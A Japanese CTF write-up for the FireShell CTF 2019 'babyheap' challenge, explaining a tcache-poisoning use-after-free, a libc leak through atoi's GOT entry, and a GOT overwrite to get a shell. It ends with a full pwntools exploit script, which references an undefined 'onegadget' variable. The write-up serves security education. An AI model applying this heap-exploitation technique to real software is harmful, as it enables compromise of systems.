---
tags: pwn
---


# FireShell CTF 2019 - babyheap

これまでに解いた問題: https://hackmd.io/@Xornet/BkemeSAhU

## 公式リポジトリ

<https://github.com/alissonbezerra/fireshell-ctf-2019>

## Writeup

### outline

tcache poisoningでUAFを引き起こす問題、使えるコマンドはCREATE, EDIT, SHOW, DELETE, FILL(CREATE+EDIT)で、これらの対象となるポインタはグローバル変数となっている。
コマンドに使用回数制限があるが、この制限はグローバル変数として管理されているので上手くアドレスを書き換えれば制限を解除することが出来る。
この書き換えと同時にポインタもグローバル変数として.bssセクションにあるので一緒に書き換えてしまい、ポインタを何らかのGOTのアドレスにする。
そしてGOT Overwriteで`system("/bin/sh")`やOne Gadgetを呼ぶ

### binary

checksecの結果は次の通り
```bash
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

問題のバイナリのmain関数をGhidraでデコンパイルすると次のようになる(変数名や関数名は適宜変えています)

```clike

void main(void)

{
  uint input;
  char buf [8];
  
  init();
  while( true ) {
    while( true ) {
      while( true ) {
        while( true ) {
          menu();
          printf("> ");
          memset(buf,0,8);
          read(0,buf,8);
          input = atoi(buf);
          if (input != 3) break;
          if (is_shown == 1) {
            puts("Again? Oh no, you can\'t");
                    /* WARNING: Subroutine does not return */
            exit(0);
          }
          show();
        }
        if (input < 4) break;
        if (input == 5) {
          puts("Bye!");
                    /* WARNING: Subroutine does not return */
          exit(0);
        }
        if (input < 5) {
          if (is_deleted == 1) {
            puts("Again? Oh no, you can\'t");
                    /* WARNING: Subroutine does not return */
            exit(0);
          }
          delete();
        }
        else {
          if (input != 0x539) goto LAB_00400b99;
          if (is_filled == 1) {
            puts("Again? Oh no, you can\'t");
                    /* WARNING: Subroutine does not return */
            exit(0);
          }
          fill();
        }
      }
      if (input != 1) break;
      if (is_created == 1) {
        puts("Again? Oh no, you can\'t");
                    /* WARNING: Subroutine does not return */
        exit(0);
      }
      create();
    }
    if (input != 2) break;
    if (is_edited == 1) {
      puts("Again? Oh no, you can\'t");
                    /* WARNING: Subroutine does not return */
      exit(0);
    }
    edit();
  }
LAB_00400b99:
  puts("Invalid option");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

デコンパイル結果が少々残念であるが説明するとコマンドと対応した数字を入力させて、グローバル変数`p`に対し概ね次のような動作をする。

1. `create`: `p = malloc(0x60)`
2. `edit(s)`: `read(0, p, 0x40)`によって`p`が指す先を編集する、ここで注ぎ込むバイト列を`s`とおく
3. `show`: `printf("Content: %s\n", p)`で`p`の中身をﾀﾞﾊﾞｧする
4. `delete`: `free(p)`する、事前に0埋め等は行われない。
5. `exit`: プログラムを終了する
6. `fill`: 隠しコマンド、コマンド選択時に1337を入力すると実行できて`create`した後に`edit`する

`delete`後に`p`を変更していないことからUAF脆弱性が存在する。
但し、各コマンドは1回しか実行出来ず、そのフラグはグローバル変数で管理されている、例外として`delete`すると再び`create`が出来るようになる(が、逆は出来ない)。
この回数制限のせいでUAFでlibcベースをリークするところまでは出来るかもしれないがそこで終わってしまう、そこでグローバル変数が.bssセクションにありPIEも無効であることからアドレスがわかることを利用しこれらのフラグを書き換えてしまう、ついでに`p`の値も書き換える。

.bssセクションの構造は次のようになっている

```
~~ 中略 ~~
0x6020a0: createのフラグ
0x6020a8: editのフラグ
0x6020b0: showのフラグ
0x6020b8: deleteのフラグ
0x6020c0: fillのフラグ
0x6020c8: p
```

これを見ると`0x6020a0`から`p`まで繋がっているのでここへ`p`を向けることが出来れば全てのグローバル変数を一気に変更できそう

### libc配置アドレスのリーク

まずはlibcアドレスのリークを行う、具体的には次のような手順を取った

1. `create`
```
p = a, *a = null
~~ tcache ~~
 (none)
```
残りコマンド: `edit, show, delete, fill`

2. `delete`
```
p = a, *a = null
~~ tcache ~~
 a -> null
```
残りコマンド: `create(復活), edit, show, fill`

3. `edit(s)`
```
p = a, *a = s
~~ tcache ~~
 a -> s -> ???
```
ここで`s`は.bssセクションで変数群の先頭である`0x6020a0`を指定する
残りコマンド: `create, show, fill`

4. `create`
```
p = a, *a = s
~~ tcache ~~
 s -> ???
```
これで次に`create`した際にmallocされる領域が`s`(`0x6020a0`)になる。
残りコマンド: `show, fill`

5. `fill(_s)`
```
p = s, *s = _s
~~ tcache ~~
 ???
```
残りコマンド: `show`

ここで`*s = _s`という任意アドレス書き換えの形になった。`_s`の長さ制限は`0x40`までなので`0x6020a0`から`&p`である`0x6020c8`まで書き換える事ができる。
そこで次のようなペイロードを`_s`として注ぎ込むことでコマンドの使用可能フラグをリセットし、ついでに`p`を何らかのGOTにしてしまう(具体的には`atoi`を設定した)

```python
payload = b""
payload += p64(0)    # createフラグのリセット
payload += p64(0)    # editフラグのリセット
payload += p64(0)    # showフラグのリセット
payload += p64(0)    # deleteフラグのリセット
payload += p64(0)    # fillフラグのリセット
payload += func_got  # p = func@got
```

これで次のような状態になる
```
p = func_got, *func_got = func_addr
~~ tcache ~~
 ???
```
残りコマンド: `create, edit, show, delete, fill`

6. `show`
```
p = func_got, *func_got = func_addr
~~ tcache ~~
 ???
```
残りコマンド: `create, edit, delete, fill`

これによって`func_addr`をリークすることが出来る。よって`func`が一度でも呼ばれてアドレス解決しているなら、この関数がlibcでどこに存在するかを調べてそのオフセットを引くとlibcの配置アドレスが判明する。

### GOT Overwrite

libcの配置先が分かったのでOne Gadgetのオフセットを足すなり、`system`のオフセットを足すなりすればシェルを起動できるアドレスを入手出来る、以後これは`shell_addr`とおく

7. `edit(shell_addr)`
```
p = func_got, *func_got = shell_addr
~~ tcache ~~
 ???
```
残りコマンド: `create, delete, fill`

GOT Overwriteによって`func`が呼ばれた際にシェルが発動する。`func = atoi`としているが、これは一度呼ばれてGOTを経由したlibcリークが出来るのもあるが毎回のコマンド選択で呼ばれているというのがある。
One Gadgetを`shell_addr`に設定するなら他の関数でも良さそうだが、`system("/bin/sh")`を呼ぶなら、引数を入力によって渡すことが出来る`atoi`が最善である。

## code

```python
from pwn import p64, u64, process, ELF


def padu64(b):
    while len(b) < 8:
        b = b + b"\x00"

    return u64(b)


def _select(s, sel, c=b"> "):
    s.recvuntil(c)
    s.sendline(sel)


def create(s):
    _select(s, b"1")


def edit(s, data="junk"):
    _select(s, b"2")
    s.recvuntil("? ")
    s.sendline(data)


def show(s):
    _select(s, b"3")
    s.recvuntil(": ")
    return s.recvline().rstrip()


def delete(s):
    _select(s, b"4")


def fill(s, data):
    _select(s, b"1337")
    s.recvuntil(b"Fill ")
    s.sendline(data)


if __name__ == '__main__':
    filename = "./babyheap"
    libcname = "./libc-2.26.so"

    elf = ELF(filename)
    libc = ELF(libcname)

    global_top = 0x6020a0
    libc_atoi = libc.symbols["atoi"]
    libc_system = libc.symbols["system"]

    s = process(filename, env={"LD_PRELOAD": libcname})
    create(s)
    delete(s)
    
    edit(s, p64(global_top))
    create(s)

    payload = p64(0) * 5
    payload += p64(elf.got["atoi"])
    fill(s, payload)
    atoi_addr = padu64(show(s))
    libc_base = atoi_addr - libc_atoi

    print(hex(libc_base))

    edit(s, p64(onegadget + libc_base))
    print(s.recvuntil("> "))
    s.send(b"2")

    s.interactive()

```

## flag

ローカルでシェル取っただけなので無し

## 参考文献
* https://bitbucket.org/ptr-yudai/writeups/src/master/2019/FireShell_CTF_2019/babyheap/